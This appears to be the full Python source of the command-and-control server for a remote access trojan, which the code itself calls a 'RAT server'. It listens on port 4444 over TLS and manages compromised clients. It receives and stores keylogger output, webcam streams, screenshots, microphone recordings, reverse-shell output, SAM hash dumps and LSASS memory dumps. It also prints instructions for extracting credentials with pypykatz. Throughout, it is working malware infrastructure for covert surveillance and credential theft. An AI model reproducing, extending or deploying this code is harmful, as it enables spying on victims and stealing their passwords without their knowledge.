"""
Server Socket - Network management and client handling
Handles TCP connections, SSL/TLS encryption, and client management
"""

from datetime import datetime
from pathlib import Path
from queue import Queue, Empty
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import numpy as np
import datetime as dt
import threading, time, uuid, base64, json, socket, ssl, cv2
            
class ClientHandler:
    """Handle individual client connection"""
    
    def __init__(self, client_socket, address, client_id, server, printer=None) -> None:
        """
        Initialize client handler
        Args:
            client_socket: Connected client socket
            address: Client address tuple (ip, port)
            client_id: Unique client identifier
            server: Reference to parent ServerSocket
        """
        self.print = printer
        self.socket = client_socket
        self.address = address
        self.client_id = client_id
        self.server = server
        
        # Client info
        self.hostname = "Unknown"
        self.os = "Unknown"
        self.features = {}
        self.connected = True
        self.connection_time = datetime.now()
        
        # Threading
        self.receive_thread = None
        self.send_thread = None
        
        # Queues for thread-safe communication
        self.send_queue = Queue()
        
        # Statistics
        self.bytes_sent = 0
        self.bytes_received = 0
        self.messages_sent = 0
        self.messages_received = 0
        
        # Data storage
        self.data_dir = Path(f"data/clients/{self.client_id}")
        self.data_dir.mkdir(parents=True, exist_ok=True)
        
        self.print(f"Client handler created for {self.address}", "info")
    
    def start(self) -> None:
        """Start handling this client"""

        self.receive_thread = threading.Thread(
            target=self._receive_loop,
            daemon=True,
            name=f"ClientRecv-{self.client_id}"
        )
        
        self.send_thread = threading.Thread(
            target=self._send_loop,
            daemon=True,
            name=f"ClientSend-{self.client_id}"
        )
        
        self.receive_thread.start()
        self.send_thread.start()
        
        self.print(f"Client handler started for {self.client_id}", "info")
    
    def _receive_loop(self) -> None:
        """Receive messages from client"""

        buffer = ""
        
        try:
            while self.connected:
                # Receive data
                data = self.socket.recv(4096)
                
                if not data:
                    self.print(f"[-] Client {self.client_id} disconnected (no data)", "info")
                    self.disconnect()
                    break
                
                # Update statistics
                self.bytes_received += len(data)
                
                # Decode and add to buffer
                try:
                    buffer += data.decode('utf-8')
                except UnicodeDecodeError as e:
                    self.print(f"Decode error from {self.client_id}: {e}" , "error")
                    continue
                
                # Process complete messages (delimited by newline)
                while '\n' in buffer:
                    message_str, buffer = buffer.split('\n', 1)
                    
                    if not message_str.strip():
                        continue
                    
                    try:
                        message = json.loads(message_str)
                        self.messages_received += 1
                        self._handle_message(message)
                    
                    except json.JSONDecodeError as e:
                        self.print(f"JSON decode error from {self.client_id}: {e}" , "error")
                        self.print(f"    Message: {message_str[:100]}", "error")
        
        except socket.timeout:
            self.print(f"Socket timeout for client {self.client_id}", "error")
            self.disconnect()
        
        except Exception as e:
            self.print(f"Receive error for client {self.client_id}: {e}", "error")
            self.disconnect()
    
    def _send_loop(self) -> None:
        """Send messages to client"""

        try:
            while self.connected:
                try:
                    # Get message from queue (blocking with timeout)
                    message = self.send_queue.get(timeout=1)
                
                except Empty:
                    continue
                
                # Convert to JSON and encode
                if isinstance(message, dict):
                    message_json = json.dumps(message)
                else:
                    message_json = str(message)
                
                # Add newline delimiter
                message_bytes = (message_json + '\n').encode('utf-8')
                
                # Send message
                self.socket.sendall(message_bytes)
                
                # Update statistics
                self.bytes_sent += len(message_bytes)
                self.messages_sent += 1
                
                self.send_queue.task_done()
        
        except Exception as e:
            self.print(f"Send error for client {self.client_id}: {e}", "error")
            self.disconnect()
    
    def _handle_message(self, message) -> None:
        """Handle incoming message from client"""

        try:
            msg_type = message.get('type', 'unknown')
            
            if msg_type == 'client_hello':
                self._handle_client_hello(message)
            
            elif msg_type == 'heartbeat':
                self._handle_heartbeat(message)

            elif msg_type == 'reverse_shell_output':
                self._handle_reverse_shell_output(message)

            elif msg_type == 'logs_archive':
                self._handle_logs_archive(message)

            elif msg_type == 'webcam_frame':
                self._handle_webcam_frame(message)
            
            elif msg_type == 'screenshot_result':
                self._handle_screenshot_result(message)
            
            elif msg_type == 'keylog_data':
                self._handle_keylog_data(message)
            
            elif msg_type == 'network_info':
                self._handle_network_info(message)
            
            elif msg_type == 'shell_result':
                self._handle_shell_result(message)
            
            elif msg_type == 'file_data':
                self._handle_file_data(message)
            
            elif msg_type == 'client_disconnect':
                self._handle_client_disconnect(message)
            
            elif msg_type == 'pong':
                self.print(f"Pong received from {self.client_id}", "debug")
            
            elif msg_type == 'config_result':
                self._handle_config_result(message)

            elif msg_type == 'config_set_result':
                self._handle_config_set_result(message)

            elif msg_type == 'config_profile_result':
                self._handle_config_profile_result(message)

            elif msg_type == 'upload_result':
                self._handle_upload_result(message)

            elif msg_type == 'hashdump_result':
                self._handle_hashdump_result(message)

            elif msg_type == 'hashdump_lsass_result':
                self._handle_hashdump_lsass_result(message)

            elif msg_type == 'audio_record_result':
                self._handle_audio_record_result(message)

            elif msg_type == 'audio_device_info':
                self._handle_audio_device_info(message)
            else:
                self.print(f"[?] Unknown message type from {self.client_id}: {msg_type}", "warning")
                self._log_unknown_message(message)
        
        except Exception as e:
            self.print(f"Error handling message from {self.client_id}: {e}", "error")
    
    def _handle_upload_result(self, message) -> None:
        """Handle upload result from client"""

        if message.get('success'):
            filepath = message.get('filepath')
            self.print(f"\nFile uploaded successfully to client: {filepath}\n", "info")
            
            # Log
            log_file = self.data_dir / "uploads.log"
            with open(log_file, 'a') as f:
                timestamp = datetime.now().isoformat()
                f.write(f"{timestamp} - Uploaded to: {filepath}\n")
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nUpload failed: {error}\n", "error")

    def _handle_hashdump_result(self, message) -> None:
        """Handle hashdump result from client"""
        if message.get('success'):
            hashes = message.get('hashes', {})
            
            self.print(f"\nHash dump received from {self.client_id}", "info")
            self.print("="*70, "info")
            
            if isinstance(hashes, dict):
                for key, value in hashes.items():
                    self.print(f"{key}: {value}", "info")
            else:
                self.print(str(hashes), "info")
            
            self.print("="*70, "info")
            
            # Save to file
            hash_file = self.data_dir / "hashdump.txt"
            with open(hash_file, 'a') as f:
                f.write(f"\n{'='*70}\n")
                f.write(f"Dump Time: {message.get('timestamp')}\n")
                f.write(f"Method: SAM Registry\n")
                f.write(f"{'='*70}\n")
                
                if isinstance(hashes, dict):
                    for key, value in hashes.items():
                        f.write(f"{key}: {value}\n")
                else:
                    f.write(str(hashes) + "\n")
                
                f.write(f"{'='*70}\n\n")
            
            self.print(f"Hashes saved to: {hash_file}\n", "info")
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nHash dump failed: {error}\n", "error")
            self.print("Make sure the client has Administrator privileges\n", "warning")

    def _handle_hashdump_lsass_result(self, message) -> None:
        """Handle LSASS dump result from client"""

        if message.get('success'):
            dump_file = message.get('dump_file')
            size = message.get('size', 0)
            note = message.get('note', '')
            
            self.print(f"\nLSASS dump created on client", "info")
            self.print("="*70, "info")
            self.print(f"File:    {dump_file}", "info")
            self.print(f"Size:    {size:,} bytes ({size / 1024 / 1024:.2f} MB)", "info")
            self.print(f"Note:    {note}", "info")
            self.print("="*70, "info")
            
            # Log
            log_file = self.data_dir / "lsass_dumps.log"
            with open(log_file, 'a') as f:
                timestamp = datetime.now().isoformat()
                f.write(f"{timestamp} - {dump_file} ({size} bytes)\n")
            
            self.print(f"\nTo download the dump file, use:", "info")
            self.print(f"    download {dump_file}\n", "info")
            self.print(f"To extract credentials locally, use:", "info")
            self.print(f"    pypykatz lsa minidump <downloaded_file>\n", "info")
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nLSASS dump failed: {error}\n", "error")
            self.print("Make sure the client has Administrator privileges\n", "warning")

    def _handle_client_hello(self, message) -> None:
        """Handle client identification"""

        self.hostname = message.get('hostname', 'Unknown')
        self.os = message.get('os', 'Unknown')
        self.features = message.get('features', {})
        
        self.print(f"Client identified: {self.hostname} ({self.os})", "info")
        self.print(f"    ID: {self.client_id}", "info")
        self.print(f"    Features: {self.features}", "info")
        
        # Send welcome message
        self.send({
            'type': 'server_hello',
            'message': 'Connected to RAT server',
            'server_time': datetime.now().isoformat(),
            'client_id': self.client_id
        })
    
    def _handle_heartbeat(self, message) -> None:
        """Handle heartbeat from client"""
        
        # Respond with heartbeat acknowledgment
        self.send({
            'type': 'heartbeat_ack',
            'timestamp': datetime.now().isoformat()
        })
    
    def _handle_webcam_frame(self, message) -> None:
        """Handle webcam stream frame"""
        
        try:
            # Get frame data
            frame_data = message.get('data')
            
            if not frame_data:
                return
            
            if isinstance(frame_data, dict):
                # Old format: dict with 'frame' key
                frame_base64 = frame_data.get('frame')
                if not frame_base64:
                    self.print(f"Dict format but no 'frame' key", "warning")
                    return
            
            elif isinstance(frame_data, str):
                frame_base64 = frame_data
            
            else:
                self.print(f"Unexpected frame data type: {type(frame_data)}", "warning")
                return
            
            # Decode base64 string to bytes
            frame_bytes = base64.b64decode(frame_base64)
            
            # Convert bytes to numpy array
            nparr = np.frombuffer(frame_bytes, np.uint8)
            
            # Decode JPEG to OpenCV image
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            
            if frame is not None:
                # Add overlay info
                height, width = frame.shape[:2]
                
                # Add client ID overlay
                cv2.putText(
                    frame, 
                    f"Client: {self.client_id}", 
                    (10, 30),
                    cv2.FONT_HERSHEY_SIMPLEX,
                    0.7,
                    (0, 255, 0),
                    2
                )
                
                # Add timestamp
                timestamp = datetime.now().strftime("%H:%M:%S")
                cv2.putText(
                    frame, 
                    timestamp, 
                    (10, height - 20),
                    cv2.FONT_HERSHEY_SIMPLEX,
                    0.6,
                    (0, 255, 0),
                    2
                )
                
                # Display frame
                window_name = f"Webcam Stream - {self.client_id}"
                cv2.imshow(window_name, frame)
                
                # Required for OpenCV display (1ms wait)
                key = cv2.waitKey(1) & 0xFF
                
                # Press 'q' to stop viewing (optional)
                if key == ord('q'):
                    cv2.destroyWindow(window_name)
                
                # Optionally save frames to disk
                if hasattr(self, 'save_stream_frames') and self.save_stream_frames:
                    stream_dir = self.data_dir / "webcam_stream"
                    stream_dir.mkdir(exist_ok=True)
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                    frame_path = stream_dir / f"frame_{timestamp}.jpg"
                    
                    cv2.imwrite(str(frame_path), frame)
            
            else:
                self.print(f"Failed to decode frame from {self.client_id}", "warning")
        
        except base64.binascii.Error as e:
            self.print(f"Base64 decode error from {self.client_id}: {e}", "warning")
        
        except Exception as e:
            self.print(f"Error displaying webcam frame from {self.client_id}: {e}", "warning")
    
    def _handle_screenshot_result(self, message) -> None:
        """Handle screenshot result"""

        filepath = message.get('filepath')
        timestamp = message.get('timestamp')
        
        self.print(f"Screenshot received from {self.client_id}: {filepath}")
        
        # Log screenshot
        log_file = self.data_dir / "screenshots.log"
        with open(log_file, 'a') as f:
            f.write(f"{timestamp} - {filepath}\n")

    def _handle_reverse_shell_output(self, message) -> None:
        """Handle reverse shell output"""
        
        output = message.get('output', '')

        print(output, end='', flush=True) # Faut pas abusé sur les self.print()

    def _handle_config_result(self, message) -> None:
        """Handle configuration result"""

        if message.get('success'):
            config = message.get('config', {})
            features = config.get('features', {})
            
            self.print(f"\nConfiguration from {self.client_id}", "info")
            self.print("="*70, "info")
            
            self.print("\nFeatures Status:", "info")
            for feature, enabled in features.items():
                status = "✓ Enabled" if enabled else "✗ Disabled"
                self.print(f"  {feature:<20} {status}", "info")
            
            self.print("\nInterval Settings (seconds):", "info")
            self.print(f"  Keylogger interval:      {config.get('keylogger_interval')}s", "info")
            self.print(f"  Webcam interval:         {config.get('webcam_interval')}s", "info")
            self.print(f"  Screenshot interval:     {config.get('screenshot_interval')}s", "info")
            self.print(f"  Network info interval:   {config.get('network_info_interval')}s", "info")
            self.print(f"  Audio duration:          {config.get('audio_duration')}s", "info")
            self.print(f"  Audio interval:          {config.get('audio_interval')}s", "info")
            
            self.print("\nStream Settings:", "info")
            res = config.get('webcam_stream_resolution', (0, 0))
            self.print(f"  Stream FPS:              {config.get('webcam_stream_fps')}", "info")
            self.print(f"  Stream resolution:       {res[0]}x{res[1]}", "info")
            self.print(f"  Stream quality:          {config.get('webcam_stream_quality')}%", "info")
            
            self.print("\nQuality Settings:", "info")
            self.print(f"  Screenshot quality:      {config.get('screenshot_quality')}%", "info")
            
            self.print("="*70 + "\n")
        
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nFailed to get config: {error}\n", "warning")

    def _handle_config_set_result(self, message) -> None:
        """Handle config set result"""

        if message.get('success'):
            param = message.get('param')
            value = message.get('value')
            
            self.print(f"\nConfiguration updated on {self.client_id}", "info")
            self.print(f"    {param} = {value}\n", "info")
        
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nFailed to set config: {error}\n", "warning")

    def _handle_config_profile_result(self, message) -> None:
        """Handle config profile result"""

        if message.get('success'):
            profile = message.get('profile')
            
            self.print(f"\nProfile '{profile}' loaded on {self.client_id}", "info")
            
            config = message.get('config', {})
            
            self.print("\nNew Configuration:", "info")
            self.print("="*70, "info")
            self.print(f"  Keylogger interval:      {config.get('keylogger_interval')}s", "info")
            self.print(f"  Webcam interval:         {config.get('webcam_interval')}s", "info")
            self.print(f"  Screenshot interval:     {config.get('screenshot_interval')}s", "info")
            self.print(f"  Stream FPS:              {config.get('webcam_stream_fps')}", "info")
            self.print(f"  Stream quality:          {config.get('webcam_stream_quality')}%", "info")
            self.print(f"  Screenshot quality:      {config.get('screenshot_quality')}%", "info")
            self.print(f"  Audio duration:          {config.get('audio_duration')}s", "info")
            self.print("="*70 + "\n", "info")
        
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nFailed to load profile: {error}\n", "warning")
            
    def _handle_keylog_data(self, message) -> None:
        """Handle keylogger data"""

        keylog_data = message.get('data')
        if keylog_data:
            self._save_keylog_data(keylog_data)
    
    def _handle_network_info(self, message) -> None:
        """Handle network information"""

        network_data = message.get('data')
        if network_data:
            self._save_network_info(network_data)
    
    def _handle_shell_result(self, message) -> None:
        """Handle shell command result"""

        command = message.get('command', 'unknown')
        output = message.get('output', '')
        error = message.get('error', '')
        
        self.print(f"\nShell result from {self.client_id}:", "info")
        self.print(f"    Command: {command}", "info")
        if output:
            self.print(f"    Output:\n{output}", "info")
        if error:
            self.print(f"    Error:\n{error}", "warning")
    
    def _handle_audio_record_result(self, message) -> None:
        """Handle audio recording result"""
        
        if message.get('success'):
            filepath = message.get('filepath')
            duration = message.get('duration', 0)
            
            self.print(f"\nAudio recording completed on client", "info")
            self.print("="*70, "info")
            self.print(f"File:     {filepath}", "info")
            self.print(f"Duration: {duration} seconds", "info")
            self.print("="*70, "info")
            
            # Log
            log_file = self.data_dir / "audio_recordings.log"
            with open(log_file, 'a') as f:
                timestamp = datetime.now().isoformat()
                f.write(f"{timestamp} - {filepath} ({duration}s)\n")
            
            self.print(f"\nTo download the audio file, use:", "info")
            self.print(f"    download {filepath}\n", "info")
        
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nAudio recording failed: {error}", "warning")
            self.print("Make sure the client has a working microphone\n", "info")

    def _handle_audio_device_info(self, message) -> None:
        """Handle audio device information"""

        if message.get('success'):
            devices = message.get('devices', [])
            default_device = message.get('default_device', 'Unknown')
            
            self.print(f"\nAudio device information from {self.client_id}", "info")
            self.print("="*70, "info")
            self.print(f"Default device: {default_device}", "info")
            self.print(f"\nAvailable input devices ({len(devices)}):", "info")
            
            for i, dev in enumerate(devices, 1):
                self.print(f"  {i}. {dev['name']}", "info")
                self.print(f"     Channels: {dev['channels']}, Sample rate: {dev['sample_rate']} Hz", "info")
            
            self.print("="*70 + "\n", "info")
        
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nFailed to get audio device info: {error}\n", "warning")
            
    def _handle_file_data(self, message) -> None:
        """Handle file download data"""

        filename = message.get('filename')
        data_b64 = message.get('data')
        
        if filename and data_b64:
            try:
                # Decode base64
                file_data = base64.b64decode(data_b64)
                
                # Save to downloads directory
                downloads_dir = self.data_dir / "downloads"
                downloads_dir.mkdir(exist_ok=True)
                
                filepath = downloads_dir / filename
                with open(filepath, 'wb') as f:
                    f.write(file_data)
                
                self.print(f"File downloaded from {self.client_id}: {filepath}", "info")
            
            except Exception as e:
                self.print(f"Error saving downloaded file: {e}", "warning")
    
    def _handle_client_disconnect(self, message) -> None:
        """Handle client disconnect notification"""

        reason = message.get('reason', 'unknown')
        self.print(f"[-] Client {self.client_id} disconnecting: {reason}", "info")
        self.disconnect()
    
    def _handle_logs_archive(self, message) -> None:
        """Handle logs archive from client"""

        if message.get('success'):
            
            filename = message.get('filename', 'logs.zip')
            data_b64 = message.get('data')
            size = message.get('size', 0)
            
            # Save to client data directory
            archive_path = self.data_dir / filename
            
            try:
                # Decode and save
                file_data = base64.b64decode(data_b64)
                
                with open(archive_path, 'wb') as f:
                    f.write(file_data)
                
                self.print(f"\nLogs archive received from {self.client_id}", "info")
                self.print("="*70, "info")
                self.print(f"File:     {archive_path}", "info")
                self.print(f"Size:     {size:,} bytes ({size / 1024 / 1024:.2f} MB)", "info")
                self.print("="*70, "info")
                self.print(f"\nExtract with: unzip {archive_path}\n", "info")
            
            except Exception as e:
                self.print(f"\nError saving logs archive: {e}\n", "warning")
        
        else:
            error = message.get('error', 'Unknown error')
            self.print(f"\nFailed to get logs archive: {error}\n", "warning")

    def _save_webcam_frame(self, frame_data) -> None:
        """Save webcam frame to disk"""

        try:
            # Extract frame
            frame_b64 = frame_data.get('frame')
            timestamp = frame_data.get('timestamp', datetime.now().isoformat())
            
            # Decode base64
            frame_bytes = base64.b64decode(frame_b64)
            
            # Create directory
            webcam_dir = self.data_dir / "webcam_stream"
            webcam_dir.mkdir(exist_ok=True)
            
            # Save frame
            filename = f"frame_{timestamp.replace(':', '-').replace('.', '-')}.jpg"
            filepath = webcam_dir / filename
            
            with open(filepath, 'wb') as f:
                f.write(frame_bytes)
            
            # Save metadata
            metadata_file = webcam_dir / "metadata.json"
            if metadata_file.exists():
                metadata_list = json.loads(metadata_file.read_text())
            else:
                metadata_list = []
            
            metadata_list.append({
                'timestamp': timestamp,
                'filename': filename,
                'resolution': frame_data.get('resolution'),
                'size_bytes': len(frame_bytes)
            })
            
            metadata_file.write_text(json.dumps(metadata_list, indent=2))
        
        except Exception as e:
            self.print(f"Error saving webcam frame: {e}", "warning")
    
    def _save_keylog_data(self, keylog_data) -> None:
        """Save keylogger data"""

        try:
            keylog_file = self.data_dir / "keylog.json"
            
            if keylog_file.exists():
                existing = json.loads(keylog_file.read_text())
            else:
                existing = []
            
            existing.append(keylog_data)
            keylog_file.write_text(json.dumps(existing, indent=2))
            
            self.print(f"Keylog data saved for {self.client_id}", "info")
        
        except Exception as e:
            self.print(f"Error saving keylog data: {e}", "warning")
    
    def _save_network_info(self, network_data) -> None:
        """Save network information"""

        try:
            network_file = self.data_dir / "network_info.json"
            
            if network_file.exists():
                existing = json.loads(network_file.read_text())
            else:
                existing = []
            
            existing.append(network_data)
            network_file.write_text(json.dumps(existing, indent=2))
            
            self.print(f"Network info saved for {self.client_id}", "info")
        
        except Exception as e:
            self.print(f"Error saving network info: {e}", "warning")
    
    def _log_unknown_message(self, message) -> None:
        """Log unknown messages for debugging"""

        try:
            log_file = self.data_dir / "unknown_messages.log"
            
            with open(log_file, 'a') as f:
                timestamp = datetime.now().isoformat()
                f.write(f"{timestamp} - {json.dumps(message)}\n")
        
        except Exception as e:
            self.print(f"Error logging unknown message: {e}", "warning")
    
    def send(self, message) -> None:
        """
        Send message to client
        Args:
            message: Dictionary or string to send
        """

        self.send_queue.put(message)
    
    def send_command(self, cmd, **kwargs) -> bool:
        """
        Send a command to the client
        Args:
            cmd: Command name
            **kwargs: Command parameters
        """

        try:
            message = {
                'type': 'command',
                'command': cmd,
                **kwargs
            }
            
            self.send(message)
            return True
        
        except Exception as e:
            self.print(f"Error sending command: {e}", "warning")
            return False
    
    def send(self, data) -> bool:
        """
        Send JSON data to client
        Args:
            data: Dictionary to send as JSON
        """

        try:
            if not self.socket:
                return False
            
            # Convert to JSON and add newline delimiter
            json_data = json.dumps(data) + '\n'
            
            # Send encoded data
            self.socket.sendall(json_data.encode('utf-8'))
            
            # Update stats
            self.messages_sent += 1
            
            return True
        
        except (BrokenPipeError, ConnectionResetError) as e:
            self.print(f"Connection error while sending: {e}", "warning")
            return False
        
        except Exception as e:
            self.print(f"Error sending data: {e}", "warning")
            return False
    
    def disconnect(self) -> None:
        """Disconnect client"""

        if not self.connected:
            return
        
        self.connected = False
        
        try:
            self.socket.close()
        except:
            pass
        
        self.print(f"[-] Client {self.client_id} disconnected", "info")
        
        # Notify server to remove client
        self.server.remove_client(self.client_id)
    
    def get_info(self) -> dict:
        """Get client information dictionary"""

        uptime = (datetime.now() - self.connection_time).total_seconds()
        
        return {
            'client_id': self.client_id,
            'address': self.address,
            'hostname': self.hostname,
            'os': self.os,
            'features': self.features,
            'connected': self.connected,
            'connection_time': self.connection_time.isoformat(),
            'uptime_seconds': round(uptime, 2),
            'bytes_sent': self.bytes_sent,
            'bytes_received': self.bytes_received,
            'messages_sent': self.messages_sent,
            'messages_received': self.messages_received
        }

class ServerSocket:
    """TCP Server with SSL/TLS encryption"""
    
    def __init__(self, host='0.0.0.0', port=4444, use_ssl=True,
                 certfile=None, keyfile=None, printer=None) -> None:
        """
        Initialize server socket
        Args:
            host: Interface to bind to (0.0.0.0 = all interfaces)
            port: Port to listen on
            use_ssl: Enable SSL/TLS encryption
            certfile: Path to server certificate
            keyfile: Path to server private key
        """

        self.print = printer
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        
        # Generate or use provided certificates
        if use_ssl:
            if certfile and keyfile:
                self.certfile = certfile
                self.keyfile = keyfile
            else:
                self.certfile, self.keyfile = self._generate_self_signed_cert()
        else:
            self.certfile = None
            self.keyfile = None
        
        # Server socket
        self.server_socket = None
        self.running = False
        
        # Client management
        self.clients = {}  # client_id: ClientHandler
        self.clients_lock = threading.Lock()
        
        # Threading
        self.accept_thread = None
        
        # Statistics
        self.total_connections = 0
        self.start_time = None
    
    def _generate_self_signed_cert(self) -> tuple:
        """Generate self-signed certificate for development"""

        cert_file = Path("server_cert.pem")
        key_file = Path("server_key.pem")
        
        if cert_file.exists() and key_file.exists():
            self.print(f"Using existing certificate: {cert_file}", "info")
            return str(cert_file), str(key_file)
        
        try:
            self.print("Generating self-signed certificate...", "info")
            
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            
            # Generate certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "State"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "City"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "RAT Server"),
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                dt.datetime.utcnow()
            ).not_valid_after(
                dt.datetime.utcnow() + dt.timedelta(days=365)
            ).add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName("localhost"),
                ]),
                critical=False,
            ).sign(private_key, hashes.SHA256())
            
            # Write certificate
            with open(cert_file, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            # Write private key
            with open(key_file, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            self.print(f"Generated self-signed certificate: {cert_file}", "info")
            return str(cert_file), str(key_file)
        
        except ImportError:
            self.print("cryptography module not found", "error")
            self.print("Install with: pip install cryptography", "error")
            self.print("Running without SSL/TLS encryption", "warning")
            return None, None
    
    def start(self, printer=None) -> None:
        """Start the server"""

        self.print = printer
        if self.running:
            self.print("Server already running", "warning")
            return
        
        try:
            # Create socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Wrap with SSL if enabled
            if self.use_ssl and self.certfile and self.keyfile:
                try:
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(self.certfile, self.keyfile)
                    self.server_socket = context.wrap_socket(
                        self.server_socket,
                        server_side=True
                    )
                    self.print("SSL/TLS encryption enabled", "info")
                except Exception as e:
                    self.print(f"SSL setup failed: {e}", "error")
                    self.print("Running without SSL/TLS encryption", "warning")
            else:
                self.print("WARNING: Running without SSL/TLS encryption!", "warning")
            
            # Bind and listen
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            self.start_time = time.time()
            
            self.print(f"Server listening on {self.host}:{self.port}", "info")
            
            # Create data directory
            Path("data/clients").mkdir(parents=True, exist_ok=True)
            
            # Start accept thread
            self.accept_thread = threading.Thread(
                target=self._accept_loop,
                daemon=True,
                name="ServerAccept"
            )
            self.accept_thread.start()
        
        except Exception as e:
            self.print(f"Error starting server: {e}", "error")
            self.running = False
    
    def _accept_loop(self) -> None:
        """Accept incoming client connections"""
        
        self.print("Waiting for client connections...", "info")
        
        while self.running:
            try:
                # Accept connection
                client_socket, address = self.server_socket.accept()
                
                self.print(f"\nNew connection from {address[0]}:{address[1]}", "info")
                
                # Generate unique client ID
                client_id = str(uuid.uuid4())[:8]
                
                # Create client handler
                client_handler = ClientHandler(
                    client_socket,
                    address,
                    client_id,
                    self,
                    printer=self.print
                )
                
                # Add to clients dict
                with self.clients_lock:
                    self.clients[client_id] = client_handler
                
                # Start handling client
                client_handler.start()
                
                # Update statistics
                self.total_connections += 1
            
            except Exception as e:
                if self.running:
                    self.print(f"Error accepting connection: {e}", "error")
                    time.sleep(1)
    
    def stop(self) -> None:
        """Stop the server"""

        self.print("Stopping server...", "critical")
        self.running = False
        
        # Disconnect all clients
        with self.clients_lock:
            for client_id, client in list(self.clients.items()):
                try:
                    client.disconnect()
                except:
                    pass
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        self.print("Server stopped", "info")
    
    def remove_client(self, client_id) -> None:
        """Remove client from active clients list"""
        
        with self.clients_lock:
            if client_id in self.clients:
                del self.clients[client_id]
                self.print(f"[-] Client {client_id} removed from active list", "info")
    
    def get_client(self, client_id) -> ClientHandler:
        """Get client by ID"""

        with self.clients_lock:
            return self.clients.get(client_id)
    
    def get_all_clients(self) -> list[ClientHandler]:
        """Get list of all connected clients"""

        with self.clients_lock:
            return list(self.clients.values())
    
    def broadcast(self, message) -> None:
        """Send message to all connected clients"""

        with self.clients_lock:
            for client in self.clients.values():
                try:
                    client.send(message)
                except Exception as e:
                    self.print(f"Error broadcasting to {client.client_id}: {e}" , "error")
    
    def get_statistics(self) -> dict:
        """Get server statistics"""

        if self.start_time:
            uptime = time.time() - self.start_time
            
            with self.clients_lock:
                active_clients = len(self.clients)
            
            return {
                'uptime_seconds': round(uptime, 2),
                'active_clients': active_clients,
                'total_connections': self.total_connections,
                'host': self.host,
                'port': self.port,
                'ssl_enabled': self.use_ssl
            }
        return None